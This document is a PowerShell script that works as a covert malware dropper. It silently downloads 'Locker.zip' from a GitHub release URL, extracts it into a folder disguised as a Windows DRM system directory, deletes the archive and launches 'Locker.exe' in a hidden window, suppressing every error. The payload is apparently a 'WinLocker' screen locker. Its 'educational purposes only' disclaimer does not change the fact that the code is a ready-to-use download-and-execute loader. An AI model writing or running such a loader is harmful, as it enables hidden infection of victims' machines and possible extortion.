# This script downloads a ZIP archive, extracts it to an obscure location,
# and then runs an executable from within the extracted folder, all silently.

# IMPORTANT SECURITY NOTE:
# This script downloads and executes files from the internet without user interaction.
# Using such scripts can be extremely dangerous if the source is not trusted.
# Ensure you fully understand the implications and risks before using or distributing this script.
# This script is provided for educational and illustrative purposes only.

# --- Configuration ---
$zipDownloadUrl = "https://github.com/Toru-de/Locker/releases/download/WinLocker/Locker.zip"
$zipFileName = "Locker.zip"
$exeFileName = "Locker.exe" # Name of the executable inside the ZIP

# --- Obscure Extraction Path ---
# This path is designed to be hard to find for a regular user.
# It uses common system paths that are usually hidden or not regularly accessed.
# Example: C:\ProgramData\Microsoft\Windows\DRM\SystemData
$extractionRoot = Join-Path $env:ProgramData "Microsoft\Windows\DRM"
$extractionFolder = "SystemData"
$extractionPath = Join-Path $extractionRoot $extractionFolder

# --- Script Execution Logic ---

# Redirect all output (Write-Host, Write-Warning, etc.) to null to ensure complete silence.
# This makes the script run without showing any console output.
# If you need to debug, comment out the following line:
# *> $null

# Create the extraction directory if it doesn't exist
try {
    New-Item -ItemType Directory -Path $extractionPath -Force | Out-Null
}
catch {
    # If directory creation fails, there's not much we can do silently.
    # The script will likely fail later when trying to extract.
    # For a completely silent script, we can't show errors to the user.
    # However, for robustness, we keep this as a potential point of failure.
    exit 1
}

# --- Download the ZIP file ---
# Use a temporary path for the downloaded ZIP file.
$tempZipPath = Join-Path $env:TEMP $zipFileName
try {
    # Use Invoke-WebRequest to download the file.
    # -UseBasicParsing is often faster and sufficient for simple downloads.
    # -ErrorAction SilentlyContinue prevents errors from being displayed.
    Invoke-WebRequest -Uri $zipDownloadUrl -OutFile $tempZipPath -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
}
catch {
    # If download fails, exit silently.
    exit 1
}

# --- Extract the ZIP file silently ---
try {
    # Expand-Archive extracts the ZIP.
    # -Force overwrites existing files if they exist.
    # -ErrorAction SilentlyContinue prevents errors from being displayed.
    Expand-Archive -Path $tempZipPath -DestinationPath $extractionPath -Force -ErrorAction SilentlyContinue | Out-Null

    # Clean up the downloaded ZIP file
    # Remove-Item deletes the temporary ZIP.
    # -ErrorAction SilentlyContinue ensures no error if the file isn't there or can't be deleted.
    Remove-Item $tempZipPath -Force -ErrorAction SilentlyContinue | Out-Null
}
catch {
    # If extraction fails, attempt to clean up the downloaded ZIP (if it exists) and exit silently.
    if (Test-Path $tempZipPath) { Remove-Item $tempZipPath -Force -ErrorAction SilentlyContinue | Out-Null }
    exit 1
}

# --- Construct the path to the executable ---
# Assuming Locker.exe is directly in the root of the extracted ZIP.
$exePath = Join-Path $extractionPath $exeFileName

# --- Run the executable ---
if (Test-Path $exePath) {
    try {
        # Start-Process launches the executable.
        # -WindowStyle Hidden ensures no new window appears for the executable.
        # -ErrorAction SilentlyContinue prevents errors from being displayed if the exe fails to launch.
        # This is the core part for silent execution.
        Start-Process -FilePath $exePath -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
    }
    catch {
        # If launching fails, exit silently.
        exit 1
    }
}
else {
    # If the executable wasn't found after extraction, exit silently.
    exit 1
}

# The script finishes here, ideally without any visible output or interaction.
